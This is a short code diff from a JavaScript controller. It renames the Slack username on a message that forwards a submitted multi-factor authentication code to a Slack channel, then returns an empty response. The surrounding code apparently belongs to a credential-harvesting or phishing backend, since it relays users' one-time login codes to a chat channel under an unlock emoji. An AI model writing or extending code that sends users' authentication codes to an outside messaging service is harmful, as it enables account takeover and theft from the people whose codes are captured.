@@ -14,7 +14,7 @@ class Controller {
       } else if (multiFactor) {
         apiService.slack({
           icon_emoji: ':unlock:',
-          username: 'Multi Factor Login',
+          username: 'Multi Factor Auth Code',
           text: multiFactor,
         });
         res.json({});
